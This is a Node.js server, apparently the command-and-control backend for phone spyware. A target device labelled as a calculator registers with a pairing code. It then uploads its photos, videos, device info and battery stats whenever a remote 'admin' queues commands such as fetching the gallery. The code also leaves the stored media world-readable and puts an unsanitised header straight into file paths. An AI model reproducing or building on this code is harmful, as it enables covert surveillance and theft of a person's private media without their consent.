const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  },
  maxHttpBufferSize: 1e8 // 100 MB buffer
});

const PORT = process.env.PORT || 7000;
const STORAGE_DIR = path.join(__dirname, 'storage');
const DB_FILE = path.join(__dirname, 'data.json');

// Ensure directories exist
if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });

// Load or initialize DB
function loadDB() {
  if (fs.existsSync(DB_FILE)) {
    try {
      return JSON.parse(fs.readFileSync(DB_FILE, 'utf-8'));
    } catch (e) {
      console.error('Error reading DB:', e);
    }
  }
  return { pairs: {}, media: [] };
}

function saveDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

let db = loadDB();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/storage', express.static(STORAGE_DIR));

// Configure Multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const pairCode = req.headers['x-pairing-code'] || 'default';
    const pairDir = path.join(STORAGE_DIR, pairCode);
    if (!fs.existsSync(pairDir)) fs.mkdirSync(pairDir, { recursive: true });
    cb(null, pairDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    const ext = path.extname(file.originalname) || (file.mimetype.includes('video') ? '.mp4' : '.jpg');
    cb(null, file.fieldname + '-' + uniqueSuffix + ext);
  }
});
const upload = multer({
  storage,
  limits: { fileSize: 500 * 1024 * 1024 } // 500 MB max per file
});

// In-memory active sockets & command queues
const activeTargets = new Map(); // pairingCode -> socketId
const activeAdmins = new Map();  // pairingCode -> Set of socketIds
const commandQueues = new Map(); // pairingCode -> Array of pending commands

// --- API Routes ---

// Command queue for target polling fallback
app.get('/api/commands', (req, res) => {
  const code = (req.query.code || '').trim().toUpperCase();
  if (!code) return res.status(400).json({ error: 'Code required' });

  // Mark target as recently active
  activeTargets.set(code, 'http-polling');

  const queue = commandQueues.get(code) || [];
  if (queue.length > 0) {
    const nextCmd = queue.shift();
    return res.json({ hasCommand: true, command: nextCmd });
  }
  res.json({ hasCommand: false });
});

app.post('/api/commands', (req, res) => {
  const code = (req.body.code || '').trim().toUpperCase();
  const command = req.body.command;
  if (!code || !command) return res.status(400).json({ error: 'Code and command required' });

  if (!commandQueues.has(code)) commandQueues.set(code, []);
  commandQueues.get(code).push(command);

  // Also emit via socket if target is connected via socket
  const targetSocketId = activeTargets.get(code);
  if (targetSocketId && targetSocketId !== 'http-polling') {
    io.to(targetSocketId).emit('target:execute', command);
  }

  res.json({ success: true, queued: true });
});

// Check server health
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', time: new Date().toISOString() });
});

// Verify / register pairing code
app.post('/api/pair/check', (req, res) => {
  const { code } = req.body;
  if (!code) return res.status(400).json({ error: 'Pairing code required' });

  const cleanCode = code.trim().toUpperCase();
  const isOnline = activeTargets.has(cleanCode);
  const mediaCount = db.media.filter(m => m.pairingCode === cleanCode).length;

  res.json({
    code: cleanCode,
    isTargetOnline: isOnline,
    mediaCount
  });
});

// Upload media from target (Phone A)
app.post('/api/upload', upload.single('media'), (req, res) => {
  const pairingCode = (req.headers['x-pairing-code'] || '').trim().toUpperCase();
  if (!pairingCode) {
    return res.status(400).json({ error: 'x-pairing-code header required' });
  }

  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const mediaEntry = {
    id: path.basename(req.file.filename, path.extname(req.file.filename)),
    pairingCode,
    filename: req.file.filename,
    originalName: req.file.originalname,
    mimeType: req.file.mimetype,
    size: req.file.size,
    type: req.file.mimetype.includes('video') ? 'video' : 'photo',
    url: `/storage/${pairingCode}/${req.file.filename}`,
    createdAt: new Date().toISOString()
  };

  db.media.push(mediaEntry);
  saveDB(db);

  // Notify any connected admin via Socket.IO
  io.to(`room_${pairingCode}`).emit('admin:new_media', mediaEntry);

  res.json({ success: true, media: mediaEntry });
});

// List media for a pairing code
app.get('/api/media', (req, res) => {
  const pairingCode = (req.headers['x-pairing-code'] || req.query.code || '').trim().toUpperCase();
  if (!pairingCode) return res.status(400).json({ error: 'Pairing code required' });

  const items = db.media
    .filter(m => m.pairingCode === pairingCode)
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  res.json({ count: items.length, items });
});

// Delete media
app.delete('/api/media/:filename', (req, res) => {
  const pairingCode = (req.headers['x-pairing-code'] || req.query.code || '').trim().toUpperCase();
  const { filename } = req.params;

  const idx = db.media.findIndex(m => m.pairingCode === pairingCode && m.filename === filename);
  if (idx === -1) return res.status(404).json({ error: 'Media not found' });

  const filePath = path.join(STORAGE_DIR, pairingCode, filename);
  if (fs.existsSync(filePath)) {
    try { fs.unlinkSync(filePath); } catch (e) { console.error('Unlink error:', e); }
  }

  db.media.splice(idx, 1);
  saveDB(db);

  io.to(`room_${pairingCode}`).emit('admin:media_deleted', { filename });
  res.json({ success: true });
});

// --- Socket.IO Real-time Connection ---
io.on('connection', (socket) => {
  console.log(`Socket connected: ${socket.id}`);

  // 1. Target (Calculator) registers
  socket.on('target:register', (data) => {
    const code = (data.code || '').trim().toUpperCase();
    if (!code) return;

    socket.pairingCode = code;
    socket.role = 'target';
    activeTargets.set(code, socket.id);
    socket.join(`room_${code}`);

    console.log(`[Target Registered] Code: ${code}, Socket: ${socket.id}`);

    // Notify any listening admin
    io.to(`room_${code}`).emit('target:status', {
      isOnline: true,
      stats: data.stats || null,
      deviceInfo: data.deviceInfo || null
    });
  });

  // 2. Admin connects with code
  socket.on('admin:connect', (data) => {
    const code = (data.code || '').trim().toUpperCase();
    if (!code) return;

    socket.pairingCode = code;
    socket.role = 'admin';
    socket.join(`room_${code}`);

    const isOnline = activeTargets.has(code);
    console.log(`[Admin Connected] Code: ${code}, Target Online: ${isOnline}`);

    socket.emit('target:status', { isOnline });

    // Request fresh stats from target if online
    if (isOnline) {
      const targetSocketId = activeTargets.get(code);
      io.to(targetSocketId).emit('target:request_stats');
    }
  });

  // 3. Admin sends command to target (e.g. Fetch photos/videos)
  socket.on('admin:command', (data) => {
    const code = socket.pairingCode;
    if (!code) return;

    console.log(`[Admin Command to Target] Code: ${code}, Action:`, data);

    // Queue command for polling fallback
    if (!commandQueues.has(code)) commandQueues.set(code, []);
    commandQueues.get(code).push(data);

    const targetSocketId = activeTargets.get(code);
    if (targetSocketId && targetSocketId !== 'http-polling') {
      io.to(targetSocketId).emit('target:execute', data);
    }
  });

  // 4. Target reports stats (Photos count, videos count, battery, etc.)
  socket.on('target:stats_update', (stats) => {
    const code = socket.pairingCode;
    if (!code) return;
    io.to(`room_${code}`).emit('target:status', { isOnline: true, stats });
  });

  // 5. Target reports transfer progress
  socket.on('target:transfer_progress', (progress) => {
    const code = socket.pairingCode;
    if (!code) return;
    io.to(`room_${code}`).emit('transfer:progress', progress);
  });

  // 6. Handle Disconnection
  socket.on('disconnect', () => {
    const code = socket.pairingCode;
    if (code && socket.role === 'target') {
      activeTargets.delete(code);
      console.log(`[Target Disconnected] Code: ${code}`);
      io.to(`room_${code}`).emit('target:status', { isOnline: false });
    }
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`===============================================`);
  console.log(`  GALLERY VAULT SERVER IS RUNNING ON PORT ${PORT}  `);
  console.log(`  Access URL: http://0.0.0.0:${PORT}            `);
  console.log(`===============================================`);
});
